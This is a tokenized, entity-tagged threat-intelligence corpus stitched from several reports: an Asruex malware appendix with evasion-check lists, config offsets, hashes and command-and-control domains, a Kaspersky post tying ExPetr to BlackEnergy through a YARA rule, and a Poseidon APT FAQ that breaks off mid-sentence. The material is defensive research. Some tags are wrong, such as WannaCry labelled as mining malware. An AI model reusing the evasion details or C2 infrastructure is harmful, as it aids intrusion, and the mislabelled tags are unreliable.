cports.exe
smsniff.exe

SocketSniff.exe

Table
A-5
:
Detectable
Combinations
of
File
Version
Information

FileDescription

CompanyName

Sysinternals

FileDescription

CompanyName

SysinternalsRegistryMonitor

Sysinternals

ProcessMonitor

Sysinternals

TCP/UDPendpointviewer

Sysinternals

TheWiresharkdevelopercommunity

TheWiresharkdevelopercommunity

RegshotTeam

NirSoft

NirSoft

NirSoft

Wireshark

Dumpcap

Regshot

CurrPorts

SmartSniff

SocketSniff

Table
A-6
:
Detectable
Disk

Names

Disk
Name
vmware

Virtual
HD

MS
VirtualSCSI
Disk
Device

Appendix
B
:
Configuration
Information

Table
B-1
:
List
of
Configuration
Information

Offset

Length

Description
0x000
0x010

Version
Information
0x014

Install
Path
0x114
64
*
3

Dummy
URLs
to
connect
to
×
3
0x1D4
256
*
3

HTTP
Access
URLs
×
3
0x4D4

Sending
data
store
path
1
0x5D4

Sending
data
strings
1

Offset

Length

Description
0x614

Sending
data
store
path
2
0x714
0x754
0x794

Sending
data
strings
2

Encode
key

Suspension
time
0x798
256
*
3

File
name
×
3

Machine
information
(
pointer
)

Connect
destination
(
pointer
)

Not
in
use
0xA98
0xA9C
0xAA0

Encode
keys
blackolive
darktea
12qw@#WE

Appendix B_hash
C I
:
SHA-256
Hash
Value
of
Artifacts

Shortcut
files
:
c60a93a712d0716a04dc656a0d1ba06be5047794deaa9769a2de5d0fcf843c2a B_hash
ae421dd24306cbf498d4f82b650b9162689e6ef691d53006e8f733561d3442e2 B_hash
980cc01ec7b2bd7c1f10931822c7cfe2a04129588caece460e05dcc0bb1b6c34 B_hash
b175567800d62dcb00212860d23742290688cce37864930850522be586efa882 B_hash
c2e99eedf555959721ef199bf5b0ac7c68ea8205d0dff6c208adf8813411a456 B_hash
ac63703ea1b36358d2bec54bddfef28f50c635d1c7288c2b08cceb3608c1aa27 B_hash
5cfc67945dd39885991131f49f6717839a3541f9ba141a7a4b463857818d01e6 B_hash
e76c37b86602c6cc929dffe5df7b1056bff9228dde7246bf4ac98e364c99b688 B_hash
606e98df9a206537d35387858cff62eb763af20853ac3fa61aee8f3c280aaafe B_hash

Downloaders
:
fdf3b42ac9fdbcabc152b200ebaae0a8275123111f25d4a68759f8b899e5bdd6 B_hash
dd2cba1a0d54a486a39f63cbd4df6129755a84580c21e767c44c0a7b60aff600 B_hash
d89e2cc604ac7da05feeb802ed6ec78890b1ef0a3a59a8735f5f772fc72c12ef B_hash
caefcdf2b4e5a928cdf9360b70960337f751ec4a5ab8c0b75851fc9a1ab507a8 B_hash
8ca8067dfef13f10e657d299b517008ad7523aacf7900a1afeb0a8508a6e11d3 B_hash
77ca1148503def0d8e9674a37e1388e5c910da4eda9685eabe68fd0ee227b727 B_hash
05f241784e673f2af8a2a423fb66e783a97f123fc3d982144c39e92f191d138d B_hash
a77d1c452291a6f2f6ed89a4bac88dd03d38acde709b0061efd9f50e6d9f3827 B_hash
2273236013c1ae52bfc6ea327330a4eba24cc6bc562954854ae37fe55a78310b B_hash
36581a19160f2a06c617a7e555ad8ec3280692442fd81bde3d47a59aea2be09a B_hash
a3f1a4a5fea81a6f12ef2e5735bb845fb9599df50ffd644b25816f24c79f53b6 B_hash
24b587280810fba994865d27f59a01f4bbdaf29a14de50e1fc2fadac841c299e B_hash
2c68cf821c4eabb70f28513c5e98fa11b1c6db6ed959f18e9104c1c882590ad2 B_hash
3f2168a9a51d6d6fe74273ebfc618ded3957c33511435091885fa8c5f854e11e B_hash
df72a289d535ccf264a04696adb573f48fe5cf27014affe65da8fd98750029db B_hash
eacc46f54fa8c8a8cf51368305803d949fa2625066ec634da9a41d08f2855617 B_hash
e139a8916f99ce77dbdf57eaeac5b5ebe23367e91f96d7af59bee7e5919a7a81 B_hash
8a6d76bd21e70a91abb30b138c12d0f97bb4971bafa072d54ce4155bea775109 B_hash
35fc95ec78e2a5ca3c7a332db9ca4a5a5973607a208b9d637429fe1f5c760dd5 B_hash

Asruex B_malware.drop
:
8af41d303db8a975759f7b35a236eb3e9b4bd2ef65b070d19bd1076ea96fa5c4 B_hash
a9ce1f4533aeec680a77d7532de5f6b142eb8d9aec4fdbe504c37720befe9ce3 B_hash
9350f7eb28f9d72698216105c51a4c5ad45323f907db9936357d6914fc992c90 B_hash
694de22c0b1a45c0e43caaa91486bc71a905443b482f2d22ded16b5ce3b0e738 B_hash
18e12feeb3fb4117ca99e152562eada2eb057c09aab8f7a424e6d889f70feb6c B_hash
148a834e2717d029a4450dfa7206fd7d36c420edb95068c57766da0f61b288e8 B_hash
d869ce2ba491713e4c3f405ad500245d883b0e7b66abeee2522e701c8493388a B_hash
fca19a78fc71691f3f97808624b24f00dd1f19ccadcc6e3a7e2be5b976d8937b B_hash
eb31f931f0e2abf340f3f95861a51e30677fd4216b2e4ee4d8570b41cb41249c B_hash
7a95930aa732d24b4c62191247dcdc4cb483d8febaab4e21ca71fec8f29b1b7c B_hash

AdvProv.dll
f06000dceb4342630bf9195c2475fcd822dfe3910b0fa21691878071d0bb10fc B_hash

Others
6d4e7d190f4d7686fd06c823389889d226ea9c8524c82c59a765bba469f2f723 B_hash
e7d51bb718c31034b597aa67408a015729be85fc3aefcc42651c57d673a4fe5a B_hash
7074a6d3ab049f507088e688c75bae581fad265ebb6da07b0efd789408116ec8 B_hash

Appendix B_url.cncsvr
D I
:
Hosts
that
Asruex B_malware.drop
connects
to
vodsx.net B_url.cncsvr
office365-file.com B_url.cncsvr
service365-team.com B_url.cncsvr
datainfocentre.com B_url.cncsvr
eworldmagazine.org B_url.cncsvr
supportservice247.com B_url.cncsvr
seminarinfocenter.net B_url.cncsvr
vdswx.net B_url.cncsvr
housemarket21.com B_url.cncsvr
product-report24.com B_url.cncsvr
requestpg.net B_url.cncsvr
secu-docu.net B_url.cncsvr
send-error.net B_url.cncsvr
send-form.net B_url.cncsvr
wzixx.net B_url.cncsvr
login-confirm.com B_url.cncsvr
2.gp
2.ly
online-dropbox.com B_url.cncsvr
sendspaces.net B_url.cncsvr
institute-secu.org B_url.cncsvr
pb.media-total.org B_url.cncsvr
response-server.com B_url.cncsvr
enewscenters.com B_url.cncsvr
sbidnest.com B_url.cncsvr
servicemain.com B_url.cncsvr
A
gut
feeling
of
old
acquaintances
,
new
tools
,
and
a
common
battleground

securelist.com/from-blackenergy-to-expetr/78937/ B_url.normal

By
GReAT

Much
has
been
written
about
the
recent
ExPetr
/
NotPetya
/
Nyetya
/
Petya
outbreak
–
you
can
read
our
findings
here
:
Schroedinger's
Pet
(
ya
)
and
ExPetr
is
a
wiper
,
not
ransomware
.

As
in
the
case
of
Wannacry B_malware.mining
,
attribution
is
very
difficult
and
finding
links
with
previously
known
malware
is
challenging
.

In
the
case
of
Wannacry B_malware.mining
,
Google's
Neel
Mehta
was
able
to
identify
a
code
fragment
which
became
the
most
important
clue
in
the
story
,
and
was
later
confirmed
by
further
evidence
,
showing
Wannacry B_malware.mining
as
a
pet
project
of
the
Lazarus
group
.

To
date
,
nobody
has
been
able
to
find
any
significant
code
sharing
between
ExPetr
/
Petya
and
older
malware
.

Given
our
love
for
unsolved
mysteries
,
we
jumped
right
on
it
.

Analyzing
the
Similarities

At
the
beginning
of
the
ExPetr
outbreak
,
one
of
our
team
members
pointed
to
the
fact
that
the
specific
list
of
extensions
used
by
ExPetr
is
very
similar
to
the
one
used
by
BlackEnergy's
killdisk B_malware.ransom
ransomware
from
2015
and
2016
(
Anton
Cherepanov
from
ESET
made
the
same
observation
on
Twitter
)
.

The
BlackEnergy
APT
is
a
sophisticated
threat
actor
that
is
known
to
have
used
at
least
one
zero
day
,
coupled
with
destructive
tools
,
and
code
geared
towards
attacking
ICS
systems
.

They
are
widely
confirmed
as
the
entity
behind
the
Ukraine
power
grid
attack
from
2015
as
well
as
a
chain
of
other
destructive
attacks
that
plagued
that
country
over
the
past
years
.

If
you
are
interested
in
reading
more
about
the
BlackEnergy
APT
,
be
sure
to
check
our
previous
blogs
on
the
topic
:

Going
back
to
the
hunt
for
similarities
,
here's
how
the
targeted
extensions
lists
looks
in
ExPetr
and
a
version
of
a
wiper
used
by
the
BE
APT
group
in
2015
:

ExPetr

2015
BlackEnergy
wiper
sample

3ds
,
.7z
,
.accdb
,
.ai
,
.asp
,
.aspx
,
.avhd
,
.back
,
.bak
,
.c
,
.cfg
,
.conf
,
.cpp
,
.cs
,
.ctl
,
.dbf
,
.disk
,
.djvu
,
.doc
,
.docx
,
.dwg
,
.eml
,
.fdb
,
.gz
,
.h
,
.hdd
,
.kdbx
,
.mail
,
.mdb
,
.msg
,
.nrg
,
.ora
,
.ost
,
.ova
,
.ovf
,
.pdf
,
.php
,
.pmf
,
.ppt
,
.pptx
,
.pst
,
.pvi
,
.py
,
.pyc
,
.rar
,
.rtf
,
.sln
,
.sql
,
.tar
,
.vbox
,
.vbs
,
.vcb
,
.vdi
,
.vfd
,
.vmc
,
.vmdk
,
.vmsd
,
.vmx
,
.vsdx
,
.vsv
,
.work
,
.xls
.3ds
,
.7z
,
.accdb
,
.accdc
,
.ai
,
.asp
,
.aspx
,
.avhd
,
.back
,
.bak
,
.bin
,
.bkf
,
.cer
,
.cfg
,
.conf
,
.crl
,
.crt
,
.csr
,
.csv
,
.dat
,
.db3
,
.db4
,
.dbc
,
.dbf
,
.dbx
,
.djvu
,
.doc
,
.docx
,
.dr
,
.dwg
,
.dxf
,
.edb
,
.eml
,
.fdb
,
.gdb
,
.git
,
.gz
,
.hdd
,
.ib
,
.ibz
,
.io
,
.jar
,
.jpeg
,
.jpg
,
.jrs
,
.js
,
.kdbx
,
.key
,
.mail
,
.max
,
.mdb
,
.mdbx
,
.mdf
,
.mkv
,
.mlk
,
.mp3
,
.msi
,
.my
,
.myd
,
.nsn
,
.oda
,
.ost
,
.ovf
,
.p7b
,
.p7c
,
.p7r
,
.pd
,
.pdf
,
.pem
,
.pfx
,
.php
,
.pio
,
.piz
,
.png
,
.ppt
,
.pptx
,
.ps
,
.ps1
,
.pst
,
.pvi
,
.pvk
,
.py
,
.pyc
,
.rar
,
.rb
,
.rtf
,
.sdb
,
.sdf
,
.sh
,
.sl3
,
.spc
,
.sql
,
.sqlite
,
.sqlite3
,
.tar
,
.tiff
,
.vbk
,
.vbm
,
.vbox
,
.vcb
,
.vdi
,
.vfd
,
.vhd
,
.vhdx
,
.vmc
,
.vmdk
,
.vmem
,
.vmfx
,
.vmsd
,
.vmx
,
.vmxf
,
.vsd
,
.vsdx
,
.vsv
,
.wav
,
.wdb
,
.xls
,
.xlsx
,
.xvd
,
.zip

Obviously
,
the
lists
are
similar
in
composition
and
formatting
,
but
not
identical
.

Moreover
,
older
versions
of
the
BE
destructive
module
have
even
longer
lists
.

Here's
a
snippet
of
an
extensions
list
from
a
2015
BE
sample
that
is
even
longer
:

Nevertheless
,
the
lists
were
similar
in
the
sense
of
being
stored
in
the
same
dot-separated
formats
.

Although
this
indicated
a
possible
link
,
we
wondered
if
we
could
find
more
similarities
,
especially
in
the
code
of
older
variants
of
BlackEnergy
and
ExPetr
.

We
continued
to
chase
that
hunch
during
the
frenetic
early
analysis
phase
and
shared
this
gut
feeling
of
a
similarity
between
ExPetr
and
BlackEnergy
with
our
friends
at
Palo
Alto
Networks
.

Together
,
we
tried
to
build
a
list
of
features
that
we
could
use
to
make
a
YARA
rule
to
detect
both
ExPetr
and
BlackEnergy
wipers
.

During
the
analysis
,
we
focused
on
the
similar
extensions
list
and
the
code
responsible
for
parsing
the
file
system
for
encryption
or
wiping
.

Here's
the
code
responsible
for
checking
the
extensions
to
target
in
the
current
version
of
ExPetr
:

This
works
by
going
through
the
target
file
system
in
a
recursive
way
,
then
checking
if
the
extension
for
each
file
is
included
in
the
dot-separated
list
.

Unfortunately
for
our
theory
,
the
way
this
is
implemented
in
older
BlackEnergy
variants
is
quite
different;
the
code
is
more
generic
and
the
list
of
extensions
to
target
is
initialized
at
the
beginning
,
and
passed
down
to
the
recursive
disk
listing
function
.

Instead
,
we
took
the
results
of
automated
code
comparisons
and
paired
them
down
to
a
signature
that
perfectly
fit
the
mould
of
both
in
the
hope
of
unearthing
similarities
.

What
we
came
up
with
is
a
combination
of
generic
code
and
interesting
strings
that
we
put
together
into
a
cohesive
rule
to
single
out
both
BlackEnergy
killdisk B_malware.ransom
components
and
ExPetr
samples
.

The
main
example
of
this
generic
code
is
the
inlined
wcscmp
function
merged
by
the
compiler's
optimization
,
meant
to
check
if
the
filename
is
the
current
folder
,
which
is
named
'
.
'
.

Of
course
,
this
code
is
pretty
generic
and
can
appear
in
other
programs
that
recursively
list
files
.

It's
inclusion
alongside
a
similar
extension
list
makes
it
of
particular
interest
to
us
–
but
remains
a
low
confidence
indicator
.

Looking
further
,
we
identified
some
other
candidate
strings
which
,
although
not
unique
,
when
combined
together
allow
us
to
fingerprint
the
binaries
from
our
case
in
a
more
precise
way
.

These
include
:

exe
/r
/f

ComSpec

InitiateSystemShutdown

When
put
together
with
the
wcscmp
inlined
code
that
checks
on
the
filename
,
we
get
the
following
YARA
rule
:

rule
blackenergy_and_petya_similarities
{
strings
:
//shutdown.exe
/r
/f
$bytes00
=
{
73
00
68
00
75
00
74
00
64
00
6f
00
77
00
6e
00
2e
00
65
00
78
00
65
00
}
//ComSpec
$bytes01
=
{
43
00
6f
00
6d
00
53
00
70
00
65
00
63
00
}
//InitiateSystemShutdown
$bytes02
=
{
49
6e
69
74
69
61
74
65
53
79
73
74
65
6d
53
68
75
74
64
6f
77
6e
45
78
57}
//68A4430110
push
0100143A4
;'ntdll.dll
'
//FF151CD10010
call
GetModuleHandleA
//3BC7
cmp
eax,edi
//7420
jz
...
$bytes03
=
{
68
?
?
?
?
?1
?0
ff
15
?
?
?
?
?
?
?0
3b
c7
74
?
?
}
//
'
/c
'
$bytes04
=
{
2f
00
63
00
}
//wcscmp(
...
$hex_string
=
{
b9
?
?
?
?
?1
?0
8d
44
24
?c
66
8b
10
66
3b
11
75
1e
66
85
d2
74
15
66
8b
50
02
66
3b
51
02
75
0f
83
c0
04
83
c1
04
66
85
d2
75
de
33
c0
eb
05
1b
c0
83
d8
ff
85
c0
0f
84
?
?
0
?
00
00
b9
?
?
?
?
?1
?0
8d
44
24
?c
66
8b
10
66
3b
11
75
1e
66
85
d2
74
15
66
8b
50
02
66
3b
51
02
75
0f
83
c0
04
83
c1
04
66
85
d2
75
de
33
c0
eb
05
1b
c0
83
d8
ff
85
c0
0f
84
?
?
0
?
00
00
}
condition
:
(
(
uint16(0
)
==
0x5A4D
)
)
and
(
filesize
<
5000000
)
and
(
all
of
them
)

When
run
on
our
extensive
(
read
:
very
big
)
malware
collection
,
the
YARA
rule
above
fires
on
BlackEnergy
and
ExPetr
samples
only
.

Unsurprisingly
,
when
used
alone
,
each
string
can
generate
false
positives
or
catch
other
unrelated
malware
.

However
,
when
combined
together
in
this
fashion
,
they
become
very
precise
.

The
technique
of
grouping
generic
or
popular
strings
together
into
unique
combinations
is
one
of
the
most
effective
methods
for
writing
powerful
Yara
rules
.

Of
course
,
this
should
not
be
considered
a
sign
of
a
definitive
link
,
but
it
does
point
to
certain
code
design
similarities
between
these
malware
families
.

This
low
confidence
but
persistent
hunch
is
what
motivates
us
to
ask
other
researchers
around
the
world
to
join
us
in
investigating
these
similarities
and
attempt
to
discover
more
facts
about
the
origin
of
ExPetr
/
Petya
.

Looking
back
at
other
high
profile
cases
,
such
as
the
Bangladesh B_malware.mining
Bank I
Heist I
or
Wannacry B_malware.mining
,
there
were
few
facts
linking
them
to
the
Lazarus
group
.

In
time
,
more
evidence
appeared
and
allowed
us
,
and
others
,
to
link
them
together
with
high
confidence
.

Further
research
can
be
crucial
to
connecting
the
dots
,
or
,
disproving
these
theories
.

We'd
like
to
think
of
this
ongoing
research
as
an
opportunity
for
an
open
invitation
to
the
larger
security
community
to
help
nail
down
(
or
disprove
)
the
link
between
BlackEnergy
and
ExPetr
/
Petya
.

Our
colleagues
at
ESET
have
published
their
own
excellent
analysis
suggesting
a
possible
link
between
ExPetr
/
Petya
and
TeleBots
(
BlackEnergy
)
.

Be
sure
to
check
out
their
analysis
.

And
as
mentioned
before
,
a
special
thanks
to
our
friends
at
Palo
Alto
for
their
contributions
on
clustering
BlackEnergy
samples
.

Hashes

ExPetr
:

027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745 B_hash

11b7b8a7965b52ebb213b023b6772dd2c76c66893fc96a18a9a33c8cf125af80 B_hash

5d2b1abc7c35de73375dd54a4ec5f0b060ca80a1831dac46ad411b4fe4eac4c6 B_hash

F52869474834be5a6b5df7f8f0c46cbc7e9b22fa5cb30bee0f363ec6eb056b95 B_hash

368d5c536832b843c6de2513baf7b11bcafea1647c65df7b6f2648840fa50f75 B_hash

A6a167e214acd34b4084237ba7f6476d2e999849281aa5b1b3f92138c7d91c7a B_hash

Edbc90c217eebabb7a9b618163716f430098202e904ddc16ce9db994c6509310 B_hash

F9f3374d89baf1878854f1700c8d5a2e5cf40de36071d97c6b9ff6b55d837fca B_hash
Poseidon B_malware.infosteal
Group
:
a
Targeted
Attack
Boutique
specializing
in
global
cyber­espionage

By
GReAT
on
February
9
,
2016
.
10:27
am
.

During
the
latter
part
of
2015
,
Kaspersky
researchers
from
GReAT
(
Global
Research
and
Analysis
Team
)
got
hold
of
the
missing
pieces
of
an
intricate
puzzle
that
points
to
the
dawn
of
the
first
Portuguese­speaking
targeted
attack
group
,
named
'
Poseidon B_malware.infosteal
.

'
The
group's
campaigns
appear
to
have
been
active
since
at
least
2005
,
while
the
very
first
sample
found
points
to
2001
.

This
signals
just
how
long
ago
the
Poseidon B_malware.infosteal
threat
actor
was
already
working
on
its
offensive
framework
.

Why
has
the
Poseidon B_malware.infosteal
threat
remained
undetected
for
so
many
years
?

In
reality
,
it
has
not
.

Most
samples
were
detected
promptly
.

However
,
Poseidon's B_malware.infosteal
practice
of
being
a
'
custom­tailored
malware
implants
boutique
'
kept
security
researchers
from
connecting
different
campaigns
under
the
umbrella
of
a
single
threat
actor
.

This
approach
entails
crafting
campaigns
components
on­demand
and
sometimes
fabricating
entirely
unique
malicious
artifacts
.

1st
Portuguese­speaking
group
#ThePoseidonAPT B_malware.infosteal
attacks
companies
globally
#TheSAS2016

Our
research
team
was
able
to
put
together
the
disparate
pieces
of
this
puzzle
by
diligently
tracing
the
evolution
of
Poseidon's B_malware.infosteal
toolkit
in
pursuit
of
an
overarching
understanding
of
how
the
actor
thinks
and
the
specific
practices
involved
in
infecting
and
extorting
its
victims
.

With
a
set
of
tools
developed
for
the
sole
purpose
of
information
gathering
and
privilege
escalation
,
the
sophistication
level
of
campaign
highlights
that
,
today
,
regional
actors
are
not
far
behind
better­known
players
in
the
global
game
of
targeted
attacks
.

Becoming
familiar
with
the
operations
of
the
Poseidon B_malware.infosteal
Group
meant
patiently
dismantling
their
modus
operandi
to
unearth
the
custom­designed
infection
tools
deployed
to
each
of
their
selected
targets
.

This
process
revealed
a
series
of
campaigns
with
highly­regionalized
malware
practices
and
geographically­skewed
victim
tasking
,
unsurprising
in
a
region
with
a
gradually­maturing
cybercrime
industry
.

The
proper
detection
of
each
iteration
of
their
evolving
toolkit
may
have
been
enough
to
thwart
specific
efforts
,
but
to
truly
understand
the
magnitude
of
Poseidon's B_malware.infosteal
combined
operations
required
an
archeological
effort
to
match
.

Frequently
asked
questions

What
exactly
is
the
Poseidon B_malware.infosteal
Group
?

The
Poseidon B_malware.infosteal
Group
is
a
long­running
team
operating
on
all
domains
:
land
,
air
,
and
sea
.

They
are
dedicated
to
running
targeted
attacks
campaigns
to
aggressively
collect
information
from
company
networks
through
the
use
of
spear­phishing B_malware.backdoor
packaged
with
embedded
,
executable
elements
inside
office
documents
and
extensive
lateral
movement
tools
.

The
information
exfiltrated
is
then
leveraged
by
a
company
front
to
blackmail
victim
companies
into
contracting
the
Poseidon B_malware.infosteal
Group
as
a
security
firm
.

Even
when
contracted
,
the
Poseidon B_malware.infosteal
Group
may
continue
its
infection
or
initiate
another
infection
at
a
later
time
,
persisting
on
the
network
to
continue
data
collection
beyond
its
contractual
obligation
.

The
Poseidon B_malware.infosteal
Group
has
been
active
,
using
custom
code
and
evolving
their
toolkit
since
at
least
2005
.

Their
tools
are
consistently
designed
to
function
on
English
and
Portuguese
systems
spanning
the
gamut
of
Windows
OS
,
and
their
exfiltration
methods
include
the
use
of
hijacked
satellite
connections
.

Poseidon B_malware.infosteal
continues
to
be
active
at
this
time
.

Why
do
you
call
it
Poseidon's B_malware.infosteal
Targeted
Attack
Boutique
?

The
presence
of
several
text
fragments
found
in
the
strings
section
of
executable
files
belonging
to
the
campaign
reveal
the
actor's
fondness
for
Greek
mythology
,
especially
regarding
Poseidon B_malware.infosteal
,
the
God
of
the
Seas
(
which
also
coincides
with
their
later
abuse
of
satellite
communications
meant
to
service
ships
at
sea
)
.

The
boutique
element
is
reflected
in
their
artisanally
adaptive
toolkit
for
lateral
movement
and
data
collection
which
appears
to
change
from
infection
to
infection
to
fit
custom­
tailored
requirements
for
each
of
their
prospective
clients
.

The
business
cycle
includes
what
is
euphemistically
referred
to
as
'
financial
forecasting
'
using
stolen
information
,
so
we
like
to
say
that
Poseidon's B_malware.infosteal
boutique
not
only
deals
in
targeted
attacks
but
also
stolen
treasures
.

How
did
you
become
aware
of
this
threat
?

Who
reported
it
?

We
noticed
that
several
security
companies
and
enthusiasts
had
unwittingly
reported
on
fragments
of
Poseidon's B_malware.infosteal
campaigns
over
the
years
.

However
,
nobody
noticed
that
these
fragments
actually
belonged
to
the
same
threat
actor
.

Perhaps
because
many
of
these
campaigns
were
designed
to
run
on
specific
machines
,
using
English
and
Portuguese
languages
,
with
diverse
command
and
control
servers
located
in
different
countries
and
soon
discarded
,
signing
malware
with
different
certificates
issued
in
the
name
of
rogue
companies
,
and
so
on
.

By
carefully
collecting
all
the
evidence
and
then
reconstructing
the
attacker's
timeline
,
we
found
that
it
was
actually
a
single
group
operating
since
at
least
2005
,
and
possible
earlier
,
and
still
active
on
the
market
.

With
this
understanding
,
GReAT
researchers
were
able
to
recognize
similarities
in
obfuscation
and
development
traits
leading
back
to
widely­reported
but
little
understood
variants
on
a
sample
in
2015
,
which
searched
for
prominent
leaders
and
secret
documents
involving
them
.

When
did
you
discover
this
targeted
attack
?

The
very
first
samples
from
this
campaign
were
detected
by
Kaspersky
Lab
back
in
the
early
2000s
.

However
,
as
noted
previously
,
it
is
a
very
complex
task
to
correlate
indicators
and
evidence
in
order
to
put
together
all
the
pieces
of
this
intricate
puzzle
.

By
the
middle
of
2015
it
was
possible
to
identify
that
throughout
this
period
of
time
it's
been
the
same
threat
actor
,
which
we
call
Poseidon B_malware.infosteal
Group
.

Who
are
the
victims
?

/
What
can
you
say
about
the
targets
of
the
attacks
?

The
targets
are
companies
in
energy
and
utilities
,
telecommunications
,
public
relations
,
media
,
financial
institutions
,
governmental
institutions
,
services
in
general
and
manufacturing
.

The
geographical
spread
of
victims
is
heavily­skewed
towards
Brazil
,
the
United
States
,
France
,

Kazakhstan
,
United
Arab
Emirates
,
India
and
Russia
.

Many
of
the
victims
have
joint
ventures
or
partner
operations
in
Brazil
.

The
importance
of
the
victims
is
not
measured
in
numbers
since
each
of
these
victims
is
a
large­scale
(
often
multinational
)
enterprise
.

What
exactly
is
being
stolen
from
the
target
machines
?

One
of
the
characteristics
of
the
group
behind
Poseidon B_malware.infosteal
is
an
active
exploration
of
domain­based
networks
.

Such
network
topology
is
typical
for
companies
and
enterprises
.

The
highest
value
asset
for
these
companies
is
proprietary
information
,
technologies
,
and
business­
sensitive
information
that
represents
significant
value
in
relation
to
investments
and
stock
valuations
.

The
Poseidon B_malware.infosteal
Group
actively
targets
this
sort
of
corporate
environment
for
the
theft
of
intellectual
property
and
commercial
information
,
occasionally
focusing
on
personal
information
on
executives
.

How
does
Poseidon's B_malware.infosteal
APT
Boutique
infect
computers
?

The
main
infection
vector
for
Poseidon B_malware.infosteal
is
the
use
of
spear­phishing B_malware.backdoor
emails
including
RTF
/
DOC
files
,
usually
with
a
human
resources
lure
.

The
executables
are
also
often
digitally
signed
and
occasionally
hidden
in
alternate
data
streams
to
fool
security
solutions
.

Poseidon's B_malware.infosteal
toolkit
displays
an
awareness
of
many
antivirus
providers
over
the
years
,
attempting
to
attack
or
spoof
these
processes
as
a
means
of
self­defense
for
their
infections
.

Once
the
infection
happens
,
it
reports
to
the
command
and
control
servers
before
beginning
a
complex
lateral
movement
phase
.

This
phase
will
often
leverage
a
specialized
tool
that
automatically
collects
a
wide
array
of
information
including
credentials
,
group
management
policies
,
and
even
system
logs
to
better
hone
further
attacks
and
assure
execution
of
their
malware
.

This
way
the
attackers
actually
know
what
applications
and
commands
they
can
use
without
raising
an
alert
to
the
network
administrator
during
lateral
movement
and
exfiltration
.

What
does
the
Poseidon B_malware.infosteal
Group
do
?
What
happens
after
a
target
machine
is
infected
?

Once
the
target's
machine
is
compromised
,
the
attacker
first
enumerates
all
processes
running
in
the
system
and
all
services
.

Then
the
attacker
looks
for
all
administrator
accounts
on
both
the
local
machine
and
the
network
.

This
technique
allows
them
to
map
network
resources
and
make
lateral
movements
inside
the
network
,
landing
in
the
perfect
machine
to
match
the
attacker's
interest
.

This
reflects
the
Poseidon B_malware.infosteal
Group's
familiarity
with
Windows
network
administration
.

In
many
cases
,
their
ultimate
interest
is
the
Domain
Controller
.

Additionally
malware
reports
itself
to
its
hardcoded
command
and
control
servers
and
established
a
backdoor
connection
,
so
the
attacker
may
have
a
permanent
remote
connection
.

What
are
the
malicious
tools
used
by
the
Poseidon B_malware.infosteal
Group
?
What
are
their
functions
?

Poseidon B_malware.infosteal
utilizes
a
variety
of
tools
.

Their
main
infection
tool
has
been
steadily
evolving
since
2005
,
with
code
remnants
remaining
the
same
to
this
day
,
while
others
have
been
altered
to
fit
the
requirements
of
new
operating
systems
and
specific
campaigns
.

A
noteworthy
addition
to
the
Poseidon B_malware.infosteal
toolkit
is
the
IGT
supertool
(
Information
Gathering
toolkit
)
,
a
bulking
15
megabyte
executable
that
orchestrates
a
series
of
different
information
collections
steps
,
exfiltration
,
and
the
cleanup
of
components
.

This
tool
appears
to
be
designed
to
operate
on
high­value
corporate
systems
like
Domain
Controllers
or
IIS
servers
that
act
as
repositories
of
valuable
information
,
particularly
for
lateral
movement
.

The
Information
Gathering
Tool
(
IGT
)
tool
is
coded
in
Delphi
and
includes
powershell
and
SQL
components
across
a
dozen
different
drops
.

This
tool
contains
several
other
executable
files
made
in
different
programming
languages
ranging
from
Visual
Basic
6
to
C#
,
each
one
performing
a
very
clear
task
devised
by
the
group
when
trying
to
obtain
more
information
from
an
objective
.

The
main
purpose
of
the
IGT
tool
is
to
make
an
inventory
of
the
system
,
saving
information
from
the
network
interfaces
and
addresses
,
credentials
belonging
to
the
Domain
and
database
server
,
services
being
run
from
the
OS
and
everything
that
could
help
the
Poseidon B_malware.infosteal
Group
make
its
attack
more
customized
to
its
victim
.

Are
the
attackers
using
any
zero­day
vulnerabilities
?

No
zero­day
vulnerabilities
have
been
found
in
the
analysis
of
the
samples
obtained
regarding
this
campaign
.

Poseidon's B_malware.infosteal
conventional
means
of
deceiving
users
with
executable
files
posing
inside
Word
and
RTF
document
files
,
and
actual
poisoned
documents
with
malicious
macro­scripts
has
been
the
sole
method
used
for
compromising
their
desired
targets
.

As
we
have
seen
in
other
targeted
campaigns
,
social
engineering
and
carefully
crafted
spear­phishing
attacks
play
a
crucial
role
in
the
effectiveness
of
getting
a
foothold
in
the
desired
system
.

Is
this
a
Windows­only
threat
?
Which
versions
of
Windows
are
targeted
?

Poseidon B_malware.infosteal
is
particularly
focused
on
the
Microsoft
Windows
operating
system
family
,
specifically
customizing
the
infection
method
for
each
one
so
as
to
gather
different
information
and
hide
its
presence
after
the
initial
infection
.

Other
products
usually
found
in
corporate
environments
,
such
as
an
SQL
server
,
are
being
used
for
lateral
movement
and
credential
harvesting
using
a
customized
toolset
designed
by
the
crafty
Poseidon B_malware.infosteal
Group
.

Because
of
Poseidon's B_malware.infosteal
longevity
,
there
are
samples
targeting
Windows
systems
as
early
as
Windows
NT
4.0
Server
and
Windows
95
Workstation
up
to
current
versions
like
Windows
8.1
,
as
well
as
server
variants
(
very
important
to
them
,
given
the
emphasis
on
reaching
Domain
Controllers
in
corporate
environments
.
)

How
is
this
different
from
any
other
targeted
attack
?

The
extortion
elements
of
this
campaign
are
what
set
it
apart
from
others
.

The
exfiltration
of
sensitive
data
is
done
in
order
to
coerce
the
victim
into
a
business
relationship
under
the
threat
of
exchanging
this
information
with
competitors
or
leveraging
it
as
part
of
the
company's
offering
of
'
investment
forecasting
'
.

Additionally
this
is
the
first
ever
publicly
known
Portuguese­speaking
targeted
attacks
campaign
.

Are
there
multiple
variants
of
the
Poseidon B_malware.infosteal
Group's
malware
?

Are
there
any
major
differences
in
the
variants
?

Poseidon B_malware.infosteal
has
maintained
a
consistently
evolving
toolkit
since
the
mid­2000s
.

The
malware
has
not
avoided
detection
but
instead
been
so
inconspicuous
as
to
not
arouse
much
suspicion
due
to
the
fact
that
this
malware
only
represents
the
initial
phase
of
the
attack
.

An
altogether
different
component
is
leveraged
once
Poseidon B_malware.infosteal
reaches
an
important
machine
like
an
enterprise's
Domain
Controller
.

This
is
where
the
main
collection
takes
place
by
use
of
the
IGT
(
Information
Gathering
Tool
)
toolkit
.

Is
the
command
and
control
server
used
by
the
Poseidon B_malware.infosteal
Group
still
active
?
Have
you
been
able
to
sinkhole
any
of
the
command
and
controls
?

Poseidon B_malware.infosteal
Group
has
interesting
practices
when
it
comes
to
its
use
of
command
and
control
servers
,
including
redundancies
and
quickly
discarding
command
and
control
(
C&Cs
)
servers
after
specific
campaigns
.

This
has
actually
allowed
us
to
sinkhole
several
domains
.

A
